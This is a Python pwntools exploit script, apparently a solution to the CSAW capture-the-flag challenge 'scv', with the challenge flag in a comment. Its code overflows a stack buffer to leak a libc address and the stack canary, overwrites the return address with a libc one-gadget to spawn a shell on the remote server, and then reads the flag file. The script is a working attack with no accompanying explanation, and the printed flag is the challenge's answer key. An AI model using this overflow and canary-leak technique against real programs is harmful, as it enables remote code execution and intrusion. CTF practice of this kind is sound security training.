#!/usr/bin/env python2
# -*- coding: ascii -*-
from pwn import *

# flag{sCv_0n1y_C0st_50_M!n3ra1_tr3at_h!m_we11}

context.arch = 'amd64'

e = ELF('./scv')
l = ELF('./libc-2.23.so')

host , port = 'pwn.chal.csaw.io' , 3764

y = remote(host,port)

def feed( food ):
    y.sendlineafter( '>>' , '1' )
    y.send( food )

def view():
    y.sendlineafter( '>>' , '2' )


p = 'D' * 0x28

feed( p )
view()

y.recvuntil( 'D' * 0x28 )

l.address += u64( y.recvline().strip().ljust( 8 , '\x00' ) ) - 0x3a299
log.success( 'libc -> {}'.format( hex( l.address ) ) )

p = 'D' * 0xA9

feed( p )
view()

y.recvuntil( 'D' * 0xA9 )

canary = u64( y.recv(7).rjust( 8, '\x00' ) )
log.success( 'canary -> {}'.format( hex( canary ) ) )

magic = 0xf0274
magic = 0xf1117

p = flat(
    'D' * 0xA8,
    canary,
    0x0,
    l.address + magic
)

feed( p )
y.sendlineafter( '>>' , '3' )

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()